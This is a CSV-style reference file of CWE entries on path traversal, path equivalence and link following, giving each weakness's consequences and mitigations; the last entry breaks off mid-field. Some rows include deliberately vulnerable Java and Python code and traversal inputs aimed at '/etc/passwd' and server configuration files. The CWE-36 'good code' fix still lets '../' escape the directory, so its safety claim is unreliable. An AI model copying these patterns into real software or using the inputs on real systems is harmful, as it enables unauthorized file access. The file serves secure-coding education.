CWE-35: Path Traversal: '.../...//',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '.../...//' (doubled triple dot slash) sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-36: Absolute Path Traversal,"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize absolute path sequences such as ""/abs/path"" that can resolve to a location that is outside of that directory.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsThe attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Files or DirectoriesThe attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesThe attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product., Likelihood: ","Example 1In the example below, the path to a dictionary file is read from a system property and used to initialize a File object.(bad code)Example Language:JavaString filename = System.getProperty(""com.domain.application.dictionaryFile"");File dictionaryFile = new File(filename);However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory.Example 2This script intends to read a user-supplied file from the current directory. The user inputs the relative path to the file and the script uses Python's os.path.join() function to combine the path to the current working directory with the provided path to the specified file. This results in an absolute path to the desired file. If the file does not exist when the script attempts to read it, an error is printed to the user.(bad code)Example Language:Pythonimport osimport sysdef main():filename = sys.argv[1]path = os.path.join(os.getcwd(), filename)try:with open(path, 'r') as f:file_data = f.read()except FileNotFoundError as e:print(""Error - file not found"")main()However, if the user supplies an absolute path, the os.path.join() function will discard the path to the current working directory and use only the absolute path provided. For example, if the current working directory is /home/user/documents, but the user inputs /etc/passwd, os.path.join() will use only /etc/passwd, as it is considered an absolute path. In the above scenario, this would cause the script to access and read the /etc/passwd file.(good code)Example Language:Pythonimport osimport sysdef main():filename = sys.argv[1]path = os.path.normpath(f""{os.getcwd()}{os.sep}{filename}"")try:with open(path, 'r') as f:file_data = f.read()except FileNotFoundError as e:print(""Error - file not found"")main()The constructed path string uses os.sep to add the appropriate separation character for the given operating system (e.g. '\' or '/') and the call to os.path.normpath() removes any additional slashes that may have been entered - this may occur particularly when using a Windows path. By putting the pieces of the path string together in this fashion, the script avoids a call to os.path.join() and any potential issues that might arise if an absolute path is entered. With this version of the script, if the current working directory is /home/user/documents, and the user inputs /etc/passwd, the resulting path will be /home/user/documents/etc/passwd. The user is therefore contained within the current working directory as intended.",无可能的缓解方案
CWE-37: Path Traversal: '/absolute/pathname/here',"The product accepts input in the form of a slash absolute path ('/absolute/pathname/here') without appropriate validation, which can allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-38: Path Traversal: '\absolute\pathname\here',"The product accepts input in the form of a backslash absolute path ('\absolute\pathname\here') without appropriate validation, which can allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-39: Path Traversal: 'C:dirname',The product accepts input that contains a drive letter or Windows volume letter ('C:dirname') that potentially redirects access to an unintended location or arbitrary file.,"Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsThe attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Files or DirectoriesThe attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesThe attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software., Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share),The product accepts input that identifies a Windows UNC share ('\\UNC\share\name') that potentially redirects access to an unintended location or arbitrary file.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-41: Improper Resolution of Path Equivalence,The product is vulnerable to file system contents disclosure through path equivalence. Path equivalence involves the use of special characters in file and directory names. The associated manipulations are intended to generate multiple names for the same object.,"Scope: ConfidentialityIntegrityAccess Control, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories; Bypass Protection MechanismAn attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism than an attacker may be able to bypass the mechanism., Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-42: Path Equivalence: 'filename.' (Trailing Dot),"The product accepts path input in the form of trailing dot ('filedir.') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-43: Path Equivalence: 'filename....' (Multiple Trailing Dot),"The product accepts path input in the form of multiple trailing dot ('filedir....') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-44: Path Equivalence: 'file.name' (Internal Dot),"The product accepts path input in the form of internal dot ('file.ordir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-45: Path Equivalence: 'file...name' (Multiple Internal Dot),"The product accepts path input in the form of multiple internal dot ('file...dir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-46: Path Equivalence: 'filename ' (Trailing Space),"The product accepts path input in the form of trailing space ('filedir ') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-47: Path Equivalence: ' filename' (Leading Space),"The product accepts path input in the form of leading space (' filedir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-48: Path Equivalence: 'file name' (Internal Whitespace),"The product accepts path input in the form of internal space ('file(SPACE)name') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-49: Path Equivalence: 'filename/' (Trailing Slash),"The product accepts path input in the form of trailing slash ('filedir/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-50: Path Equivalence: '//multiple/leading/slash',"The product accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,无可能的缓解方案
CWE-51: Path Equivalence: '/multiple//internal/slash',"The product accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-52: Path Equivalence: '/multiple/trailing/slash//',"The product accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-53: Path Equivalence: '\multiple\\internal\backslash',"The product accepts path input in the form of multiple internal backslash ('\multiple\trailing\\slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-54: Path Equivalence: 'filedir\' (Trailing Backslash),"The product accepts path input in the form of trailing backslash ('filedir\') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-55: Path Equivalence: '/./' (Single Dot Directory),"The product accepts path input in the form of single dot directory exploit ('/./') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-56: Path Equivalence: 'filedir*' (Wildcard),"The product accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-57: Path Equivalence: 'fakedir/../realdir/filename',"The product contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. This allows attackers to perform unauthorized actions against the targeted file.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.
CWE-58: Path Equivalence: Windows 8.3 Filename,"The product contains a protection mechanism that restricts access to a long filename on a Windows operating system, but it does not properly restrict access to the equivalent short ""8.3"" filename.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  System ConfigurationDisable Windows from supporting 8.3 filenames by editing the Windows registry. Preventing 8.3 filenames will not remove previously generated 8.3 filenames.
CWE-59: Improper Link Resolution Before File Access ('Link Following'),"The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.","Scope: ConfidentialityIntegrityAccess Control, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories; Bypass Protection MechanismAn attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism., Likelihood: ; Scope: Other, Impact: Technical Impact:Execute Unauthorized Code or CommandsWindows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a "".LNK"" file can be uploaded like a normal file. This can enable remote execution., Likelihood: ",无示范例子,Phase:  Architecture and DesignStrategy:  Separation of PrivilegeFollow the principle of least privilege when assigning access rights to entities in a software system.Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
CWE CATEGORY: DEPRECATED: UNIX Path Link Problems,"This category has been deprecated. It covered a very low level of abstraction based on operating system, which was not useful for any existing view.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-61: UNIX Symbolic Link (Symlink) Following,"The product, when opening a file or directory, does not sufficiently account for when the file is a symbolic link that resolves to a target outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  ImplementationSymbolic link attacks often occur when a program creates a tmp directory that stores files/links. Access to the directory should be restricted to the program as to prevent attackers from manipulating the files.Phase:  Architecture and DesignStrategy:  Separation of PrivilegeFollow the principle of least privilege when assigning access rights to entities in a software system.Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
CWE-62: UNIX Hard Link,"The product, when opening a file or directory, does not sufficiently account for when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  Architecture and DesignStrategy:  Separation of PrivilegeFollow the principle of least privilege when assigning access rights to entities in a software system.Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
CWE CATEGORY: DEPRECATED: Windows Path Link Problems,"This category has been deprecated. It covered a very low level of abstraction based on operating system, which was not useful for any existing view.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-64: Windows Shortcut Following (.LNK),"The product, when opening a file or directory, does not sufficiently handle when the file is a Windows shortcut (.LNK) whose target is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  Architecture and DesignStrategy:  Separation of PrivilegeFollow the principle of least privilege when assigning access rights to entities in a software system.Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
CWE-65: Windows Hard Link,"The product, when opening a file or directory, does not sufficiently handle when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,Phase:  Architecture and DesignStrategy:  Separation of PrivilegeFollow the principle of least privilege when assigning access rights to entities in a software system.Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
CWE-66: Improper Handling of File Names that Identify Virtual Resources,"The product does not handle or incorrectly handles a file name that identifies a ""virtual"" resource that is not directly specified within the directory that is associated with the file name, causing the product to perform file-based operations on a resource that is not a file.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ",无示范例子,无可能的缓解方案
CWE-67: Improper Handling of Windows Device Names,"The product constructs pathnames from user input, but it does not handle or incorrectly handles a pathname containing a Windows device name such as AUX or CON. This typically leads to denial of service or an information exposure when the application attempts to process the pathname as a regular file.","Scope: AvailabilityConfidentialityOther, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Read Application Data; Other, Likelihood: ",无示范例子,Phase:  ImplementationBe familiar with the device names in the operating system where your system is deployed. Check input for these device names.
CWE CATEGORY: DEPRECATED: Windows Virtual File Problems,This category has been deprecated as it was found to be an unnecessary abstraction of platform specific details. Please refer to the categoryCWE-632and weaknessCWE-66for relevant relationships.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream,"The product does not properly prevent access to, or detect usage of, alternate data streams (ADS).","Scope: Access ControlNon-RepudiationOther, Impact: Technical Impact:Bypass Protection Mechanism; Hide Activities; Other, Likelihood: ",无示范例子,Phase:  TestingSoftware tools are capable of finding ADSs on your system.Phase:  ImplementationEnsure that the source code correctly parses the filename to read or write to the correct stream.
CWE CATEGORY: DEPRECATED: Mac Virtual File Problems,This category has been deprecated as it was found to be an unnecessary abstraction of platform specific details. Please refer to the categoryCWE-632and weaknessCWE-66for relevant relationships.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-71: DEPRECATED: Apple '.DS_Store',This entry has been deprecated as it represents a specific observed example of a UNIX Hard Link weakness type rather than its own individual weakness type. Please refer toCWE-62.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-72: Improper Handling of Apple HFS+ Alternate Data Stream Path,The product does not properly handle special paths that may identify the data or resource fork of a file on the HFS+ file system.,"Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",Example 1A web server that interprets FILE.cgi as processing instructions could disclose the source code for FILE.cgi by requesting FILE.cgi/..namedfork/data. This might occur because the web server invokes the default handler which may return the contents of the file.,无可能的缓解方案
CWE-73: External Control of File Name or Path,The product allows user input to control or influence paths or file names that are used in filesystem operations.,"Scope: IntegrityConfidentiality, Impact: Technical Impact:Read Files or Directories; Modify Files or DirectoriesThe application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Files or Directories; Execute Unauthorized Code or CommandsThe application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (Other)The application can operate on unexpected files. Availability can be violated if the attacker specifies an unexpected file that the application modifies. Availability can also be affected if the attacker specifies a filename for a large file, or points to a special device or a file that does not have the format that the application expects., Likelihood: ","Example 1The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as ""../../tomcat/conf/server.xml"", which causes the application to delete one of its own configuration files (CWE-22).(bad code)Example Language:JavaString rName = request.getParameter(""reportName"");File rFile = new File(""/usr/local/apfr/reports/"" + rName);...rFile.delete();Example 2The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.(bad code)Example Language:Javafis = new FileInputStream(cfg.getProperty(""sub"")+"".txt"");amt = fis.read(arr);out.println(arr);","Phase:  Architecture and 